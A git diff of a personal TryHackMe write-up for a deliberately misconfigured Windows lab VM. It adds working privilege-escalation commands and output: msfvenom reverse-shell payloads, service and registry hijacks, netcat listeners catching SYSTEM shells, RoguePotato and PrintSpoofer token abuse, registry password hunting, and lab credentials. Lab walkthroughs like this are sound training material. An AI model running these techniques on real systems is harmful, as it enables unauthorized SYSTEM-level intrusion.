@@ -1,10 +1,5 @@
 <h1 align="center">Windows PrivEsc</h1>
-<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/b455aeed-0049-4514-8a44-a93278cb6aad"><br>
-2025, October 15<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
-and I’m excited to join you on this adventure, part of my <code>527</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
-<em>Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321</em>.<br>
-Access it <a href="https://tryhackme.com/room/windows10privesc">here</a>.<br>
-<img width="1200px" src="https://github.com/user-attachments/assets/9bacec5c-44ca-4799-b190-ffb8d912b160"></p>
+<p align="center">2025, October 21  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>533</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321 &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/windows10privesc">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/358f6cfc-e326-44dc-8eb7-e3100f86ef75"></p>
 
 <h1>Summary</h1>
 <p>
@@ -57,7 +52,7 @@ After each technique, you should have a admin or SYSTEM shell.<br>
 <code>No answer needed</code></p>
 
 ```bash
-:~/WindowsPrivEsc# xfreerdp /u:user /p:password321 /cert:ignore /v:xx.xxx.xx.xx /dynamic-resolution
+:~/WindowsPrivEsc# xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.213.63 /dynamic-resolution
 ```
 
 <p align="center"><img width="600px" src="https://github.com/user-attachments/assets/7c525352-dd17-49b7-8e00-e1dc5740c33b"></p>
@@ -137,7 +132,9 @@ xx.xxx.xx.xx - - [15/Oct/2025 xx:xx:xx] "GET /reverse.exe HTTP/1.1" 200 -
 PS C:\PrivEsc>reverse.exe
 ```
 
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5df3030d-b7de-4945-885c-3e6c6c7abd8d"></p>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/4c2481e6-38a6-45f1-8842-4a684718f672"></p>
+
+
 
 <br>
 <h2>Task 3 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Insecure Service Permissions<a id='3'></a></h2>
@@ -180,10 +177,6 @@ RW daclsvc
 C:\PrivEsc>
 ```
 
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5f12f1d5-a431-404e-9afa-b5ad72ab6c4b"></p>
-
-<br>
-
 ```bash
 C:\PrivEsc>sc qc daclsvc
 [SC] QueryServiceConfig SUCCESS
@@ -213,7 +206,8 @@ C:\PrivEsc>
 C:\PrivEsc>sc net start daclsvc
 ```
 
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/fcfaa6e6-90f1-4bd3-8c0a-1a9e3f18cfb4"></p>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/56686e81-9753-483b-a90d-e497ba14067d"></p>
+
 
 <br>
 <h2>Task 4 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Unquoted Service Path<a id='4'></a></h2>
@@ -240,24 +234,22 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 ```bash
 C:\PrivEsc>sc qc unquotedsvc
-sc qc unquotedsvc
 [SC] QueryServiceConfig SUCCESS
 
 SERVICE_NAME: unquotedsvc
-        TYPE               : 10  WIN32_OWN_PROCESS 
+        TYPE               : 10  WIN32_OWN_PROCESS
         START_TYPE         : 3   DEMAND_START
         ERROR_CONTROL      : 1   NORMAL
         BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-        LOAD_ORDER_GROUP   : 
+        LOAD_ORDER_GROUP   :
         TAG                : 0
         DISPLAY_NAME       : Unquoted Path Service
-        DEPENDENCIES       : 
+        DEPENDENCIES       :
         SERVICE_START_NAME : LocalSystem
 ```
 
 ```bash
-C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
-C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+C:\PrivEsc>accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
 C:\Program Files\Unquoted Path Service
   Medium Mandatory Level (Default) [No-Write-Up]
   RW BUILTIN\Users
@@ -267,14 +259,15 @@ C:\Program Files\Unquoted Path Service
 ```
 
 ```bash
-C:\PrivEsc>copy C:\PrivEsc\program.exe "C:\Program Files\Unquoted Path Service\Common.exe"
-copy C:\PrivEsc\program.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
         1 file(s) copied.
 ```
 
 ```bash
 C:\PrivEsc>net start unquotedsvc
 ```
+
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/59e36553-053f-44e3-9ce6-24b71b75093d"></p>
 
 <br>
 <h2>Task 5 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Weak Registry Permissions<a id='5'></h2>
@@ -315,12 +308,9 @@ HKLM\System\CurrentControlSet\Services\regsvc
 ```
 
 ```bash
-C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f            
-reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f
+C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
 The operation completed successfully.
 ```
-
-<img width="1093" height="272" alt="image" src="https://github.com/user-attachments/assets/21de0e21-54dc-4c44-8c41-4844737e3598" />
 
 ```bash
 C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f            
@@ -331,6 +321,8 @@ The operation completed successfully.
 ```bash
 C:\PrivEsc>net start regsvc
 ```
+
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/779e2aad-7e4d-46b4-a801-1caa79ff20b5"></p>
 
 <br>
 <h2>Task 6 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Insecure Service Executables<a id='6'></h2>
@@ -390,12 +382,11 @@ C:\Program Files\File Permissions Service\filepermservice.exe
 	FILE_ALL_ACCESS
 ```
 
-<img width="1091" height="486" alt="image" src="https://github.com/user-attachments/assets/3987011c-672f-4904-a4e9-885e47f4a88d" />
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3987011c-672f-4904-a4e9-885e47f4a88d"></p>
 
 
 ```bash
-C:\PrivEsc>copy C:\PrivEsc\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
-copy C:\PrivEsc\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
         1 file(s) copied.
 ```
 
@@ -413,7 +404,7 @@ Microsoft Windows [Version 10.0.17763.737]
 C:\Windows\system32>
 ```
 
-<img width="1097" height="145" alt="image" src="https://github.com/user-attachments/assets/5f90c63d-a144-46c6-b6f9-9de57ff30862" />
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/24c8be6f-8eda-408c-96a8-d68c4154ade2"></p>
 
 <br>
 <h2>Task 7 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆 - Autoruns<a id='7'></h2>
@@ -446,7 +437,6 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
     My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
 ```
 
-
 ```bash
 C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
 
@@ -468,7 +458,8 @@ C:\Program Files\Autorun Program\program.exe
         FILE_ALL_ACCESS
 ```
 
-<img width="765" height="365" alt="image" src="https://github.com/user-attachments/assets/1fdd08a0-5932-4305-a723-469c851e5e2b" />
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/1fdd08a0-5932-4305-a723-469c851e5e2b"></p>
+
 
 ```bash
 C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
@@ -501,9 +492,6 @@ C:\PrivEsc>copy C:\PrivEsc\program.exe "C:\Program Files\Autorun Program\program
 Listening on 0.0.0.0 4444
 ```
 
-<img width="431" height="160" alt="image" src="https://github.com/user-attachments/assets/2fa5a318-6bc7-49a4-9f3b-50fad165d46b" />
-
-
 ```bash
 :~# apt install rdesktop
 ```
@@ -512,11 +500,7 @@ Listening on 0.0.0.0 4444
 :~# rdesktop xx.xxx.xx.xxx
 ```
 
-<img width="688" height="317" alt="image" src="https://github.com/user-attachments/assets/ceac5eb1-d409-4bbe-85d5-ca3c10bad390" />
-
-
-<img width="814" height="374" alt="image" src="https://github.com/user-attachments/assets/691a7cae-8a19-4da2-8d59-c2e358c64baf" />
-
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/39882bd2-ef90-4732-a673-e212e735fd13"></p>
 
 ```bash
 :~# nc -nlvp 4444
@@ -528,6 +512,9 @@ Microsoft Windows [Version 10.0.17763.737]
 C:\Windows\system32>
 ```
 
+<img width="1175" height="696" alt="image" src="https://github.com/user-attachments/assets/acc61026-0ca4-4e91-94e5-0c1d8454f156" />
+
+
 <br>
 <h2>Task 8 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆 - AlwaysInstallElevated<a id='8'></h2>
 
@@ -537,18 +524,21 @@ C:\Windows\system32>
 <code>No answer needed</code></p>
 
 ```bash
-C:\PrivEsc>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
 ```
 
 ```bash
-C:\PrivEsc>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
 ```
 
-<img width="878" height="242" alt="image" src="https://github.com/user-attachments/assets/b9b0978b-6233-4cc8-b08e-02692753d0c4" />
-
-
 ```bash
-:~/WindowsPrivEsc# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.53.119 LPORT=1234 -f msi -o reverse.msi
+:~/WindowsPrivEsc# msfvenom -p windows/x64/shell_reverse_tcp LHOST=xx.xx.xxx.xx LPORT=9001 -f msi -o reverse.msi
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -561,16 +551,16 @@ Saved as: reverse.msi
 PS C:\PrivEsc> wget http://xx.xxx.x.xx:8000/reverse.msi -o reverse.msi
 ```
 
+<img width="1094" height="690" alt="image" src="https://github.com/user-attachments/assets/230b436b-c714-4f4e-842e-6ea99a6967b3" />
+
+
 ```bash
 C:\PrivEsc>msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
-<img width="887" height="167" alt="image" src="https://github.com/user-attachments/assets/5c84b91d-d7ab-4fc3-88d9-4f9dd52143ff" />
-
-
 ```bash
-:~/WindowsPrivEsc# nc -nlvp 1234
-Listening on 0.0.0.0 1234
+:~/WindowsPrivEsc# nc -nlvp 9001
+Listening on 0.0.0.0 9001
 Connection received on xx.xxx.xx.xx 49857
 Microsoft Windows [Version 10.0.17763.737]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -578,7 +568,8 @@ Microsoft Windows [Version 10.0.17763.737]
 C:\Windows\system32>
 ```
 
-<img width="1159" height="232" alt="image" src="https://github.com/user-attachments/assets/2a6733c7-0cea-45fa-9237-1174bdedc0f8" />
+<img width="1162" height="712" alt="image" src="https://github.com/user-attachments/assets/390464e7-9c44-4303-a95a-b8b6d907b89e" />
+
 
 <br>
 <br>
@@ -604,10 +595,39 @@ On Kali, use the winexe command to spawn a command prompt running with the admin
 <code>password123</code></p>
 
 ```bash
-C:\PrivEsc>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+C:\Windows\system32>bashreg query HKLM /f password /t REG_SZ /s
 ```
 
-<img width="891" height="561" alt="image" src="https://github.com/user-attachments/assets/aaff3665-6fc0-4f28-84d8-c58388a5746e" />
+```bash
+C:\Windows\system32>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+```
+
+<img width="1160" height="658" alt="image" src="https://github.com/user-attachments/assets/1b1a20c9-6e6c-4cf8-8150-b43d9f18c3a2" />
+
+
+```bash
+:~/WindowsPrivEsc# rpcclient -U 'admin' //xx.xxx.xx.xx
+Password for [WORKGROUP\admin]:
+rpcclient $> 
+```
+
+```bash
+rpcclient $> enumdomusers
+user:[admin] rid:[0x3e9]
+user:[Administrator] rid:[0x1f4]
+user:[DefaultAccount] rid:[0x1f7]
+user:[Guest] rid:[0x1f5]
+user:[user] rid:[0x3e8]
+user:[WDAGUtilityAccount] rid:[0x1f8]
+```
+
+```bash
+rpcclient $> enumdomgroups
+group:[None] rid:[0x201]
+rpcclient $> 
+```
+
+<img width="1166" height="262" alt="image" src="https://github.com/user-attachments/assets/2abfa583-1a9f-435a-9e73-ad907c7c631f" />
 
 <br>
 <br>
@@ -788,11 +808,79 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 
 
 ```bash
-:~/WindowsPrivEsc# socat tcp-listen:135,reuseaddr,fork tcp:xx.xxx.xx.xx:9999
+:~/WindowsPrivEsc# :~/WindowsPrivEsc# socat tcp-listen:135,reuseaddr,fork tcp:10.10.213.63:9999
 ```
 
+```bash
+:~/WindowsPrivEsc# nc -nlvp 4444
+Listening on 0.0.0.0 4444
+```
+
+```bash
+C:\PrivEsc>PsExec64.exe -i -u "NT AUTHORITY\local service" C:\PrivEsc\reverse.exe
+```
+
+```bash
+:~/WindowsPrivEsc# nc -nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on xx.xxx.xx.xx 49905
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+```bash
+C:\PrivEsc>whoami /priv
+```
+
+<img width="1158" height="632" alt="image" src="https://github.com/user-attachments/assets/24b49fe9-2540-40ed-a313-fde511572921" />
+
+<img width="1160" height="810" alt="image" src="https://github.com/user-attachments/assets/07a1537a-1c25-4f37-9183-c60fad3c3913" />
+
+<img width="1166" height="805" alt="image" src="https://github.com/user-attachments/assets/2656d907-40ba-493c-b3fb-e6dc4b8a0a12" />
+
+
+<br>
 <p>16.2. NName the other user privilege that allows this exploit to work..<br>
-<code>______</code></p>
+<code>SeAssignPrimaryTokenPrivilege</code></p>
+
+```bash
+:~/WindowsPrivEsc# msfvenom -p windows/x64/shell_reverse_tcp LHOST=xx.xx.xxx.xx LPORT=1337 -f exe -o reverse2.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse2.exe
+```
+
+```bash
+:~/WindowsPrivEsc# ls
+reverse2.exe  reverse.exe  reverse.msi
+```
+
+```bash
+C:\Windows\system32>C:\PrivEsc\RoguePotato.exe -r xx.xx.xxx.xx -e "C:\PrivEsc\reverse2.exe" -l 9999
+C:\PrivEsc\RoguePotato.exe -r xx.xx.xxx.xx-e "C:\PrivEsc\reverse2.exe" -l 9999
+[+] Starting RoguePotato...
+[*] Creating Rogue OXID resolver thread
+[*] Creating Pipe Server thread..
+[*] Creating TriggerDCOM thread...
+[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
+[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
+[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
+[*] IStoragetrigger written:106 bytes
+[*] SecurityCallback RPC call
+[*] ServerAlive2 RPC Call
+[*] SecurityCallback RPC call
+[*] ResolveOxid2 RPC call, this is for us!
+[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
+[*] Client connected!
+[+] Got SYSTEM Token!!!
+[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\PrivEsc\reverse2.exe
+[+] RoguePotato gave you the SYSTEM powerz :D
+```
 
 <br>
 <h2>Task 17 . 𝗧𝗼𝗸𝗲𝗻 𝗜𝗺𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘁𝗶𝗼𝗻 - PrintSpoofer<a id='17'></h2>
@@ -811,6 +899,63 @@ Now, in the "local service" reverse shell you triggered, run the PrintSpoofer ex
 <p>17.1.  Read and follow along with the above.<br>
 <code>No answer needed</code></p>
 
+```bash
+:~/WindowsPrivEsc# nc -nlvp 4444
+Listening on 0.0.0.0 4444
+```
+
+```bash
+C:\PrivEsc>PSExec64.exe -i -u "NT AUTHORITY\local service" C:\PrivEsc\reverse.exe
+```
+
+<img width="1168" height="664" alt="image" src="https://github.com/user-attachments/assets/24a154c0-031f-4b8e-941f-2de9b95b7506" />
+
+```bash
+:~/WindowsPrivEsc# nc -nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.151.241 49876
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+```bash
+:~/WindowsPrivEsc# nc -nlvp 1337
+Listening on 0.0.0.0 1337
+```
+
+```bash
+C:\PrivEsc>PrintSpoofer.exe -c "C:\PrivEsc\reverse2.exe" -i
+```
+
+```bash
+:~/WindowsPrivEsc# nc -nlvp 1337
+Listening on 0.0.0.0 1337
+Connection received on 10.10.151.241 49896
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeCreateTokenPrivilege                    Create a token object                                              Enabled
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
+```
+
+
+<img width="1247" height="770" alt="image" src="https://github.com/user-attachments/assets/b7f66d7a-560f-499f-9528-7daa3f1870bb" />
+
+
 <br>
 <h2>Task 18 . Privilege Escalation Scripts<a id='18'></h2>
 <p>Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:<br>
@@ -827,8 +972,8 @@ Now, in the "local service" reverse shell you triggered, run the PrintSpoofer ex
 <br>
 <br>
 <h1 align="center">In Progress</h1>
-<p align="center"><img width="1200px" src=""><br>
-                  <img width="1200px" src=""></p>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b33e6ed9-3d2a-4fa2-8c5b-9fe9997a3240"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/9bd8a72f-36e4-420c-afe1-7be6e9c9a585"></p>
 
 <h1 align="center">My TryHackMe Journey ・ 2025, October</h1>
 
@@ -836,9 +981,15 @@ Now, in the "local service" reverse shell you triggered, run the PrintSpoofer ex
 
 | Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
 |:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
-|15      |Medium 🔗 - Windows PrivEsc, in progress| 527   |      91ˢᵗ    |      4ᵗʰ     |      83ʳᵈ    |     2ⁿᵈ    | 131,050  |  1,002    |    79     |
-|15      |Medium 🔗 - Linux Threat Detection 3   | 527    |      92ⁿᵈ    |      4ᵗʰ     |      83ʳᵈ    |     2ⁿᵈ    | 131,034  |  1,002    |    79     |
-|14      |Medium 🔗 - Windows PrivEsc, in progress| 526   |      92ⁿᵈ    |      4ᵗʰ     |      85ʰ     |     2ⁿᵈ    | 130,954  |  1,002    |    79     |
+|21      |Medium 🔗 - Windows PrivEsc            | 533    |      87ᵗʰ    |      4ᵗʰ     |      88ᵗʰ    |     2ⁿᵈ    | 131,737  |  1,011    |    79     |
+|20      |Hard 🚩 - Enterprise                   | 532    |      87ᵗʰ    |      4ᵗʰ     |      81ˢᵗ    |     2ⁿᵈ    | 131,729  |  1,010    |    79     |
+|19      |Hard 🚩 - Misguided Ghosts             | 531    |      87ᵗʰ    |      4ᵗʰ     |      77ᵗʰ    |     2ⁿᵈ    | 131,661  |  1,009    |    79     |
+|18      |Hard 🚩 - Year of the Pig              | 530    |      89ᵗʰ    |      4ᵗʰ     |      72ⁿᵈ    |     2ⁿᵈ    | 131,531  |  1,008    |    79     |
+|18      |Easy 🚩 - The Phishing Pond            | 530    |      90ᵗʰ    |      4ᵗʰ     |      74ᵗʰ    |     2ⁿᵈ    | 131,501  |  1,007    |    79     |
+|17      |Hard 🚩 - Initial Access Pot           | 529    |      90ᵗʰ    |      4ᵗʰ     |      68ᵗʰ    |     2ⁿᵈ    | 131,456  |  1,006    |    79     |
+|17      |Medium 🔗 - AllSignsPoint2Pwnage       | 529    |      90ᵗʰ    |      4ᵗʰ     |      87ᵗʰ    |     2ⁿᵈ    | 131,186  |  1,005    |    79     |
+|16      |Easy 🔗 - Network Traffic Basics       | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,138  |  1,004    |    79     |
+|16      |Medium 🔗 - Linux Threat Detection 3   | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,066  |  1,003    |    79     |
 |13      |Hard 🚩 - M4tr1x: Exit Denied          | 525    |      92ⁿᵈ    |      4ᵗʰ     |      76ᵗʰ    |     2ⁿᵈ    | 130,938  |  1,002    |    79     |
 |12      |Easy 🔗 - Atlas                        | 524    |     101ˢᵗ    |      4ᵗʰ     |     251ˢᵗ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
 |11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
@@ -866,11 +1017,11 @@ Now, in the "local service" reverse shell you triggered, run the PrintSpoofer ex
 
 <br>
 
-<p align="center">Global All Time:   91ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/25614f4d-393e-495f-b359-0f6fbd0184b7"><br>
-                                              <img width="1200px" src="https://github.com/user-attachments/assets/bfb8887d-96e0-43d0-ad78-8e92218e24b7"><br><br>
-                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/df7cc466-38dc-4531-86da-6d10c5d0323e"><br>
-                  Global monthly:     83ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/291bfed5-b1bf-4ec8-a777-86093d7eb01e"><br>
-                  Brazil monthly:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/96a5afad-fbe6-4e96-80fe-364fb3e6ac3c"></p>
+<p align="center">Global All Time:   87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/ff23cd8b-e608-4be7-bd36-f359df9d3f30"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/a73135d7-b4d9-483b-8655-364d2e5248f5"><br><br>
+                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d6eac27f-709b-4f7d-bbbc-adf4d47490f4"><br>
+                  Global monthly:     88ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/aec49fd3-f5af-4c07-bdee-85eb3035ea2c"><br>
+                  Brazil monthly:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/6e73178d-116f-40d2-a6a5-e786a4d51399"></p>
 
 
 <h1 align="center">Thanks for coming!</h1>
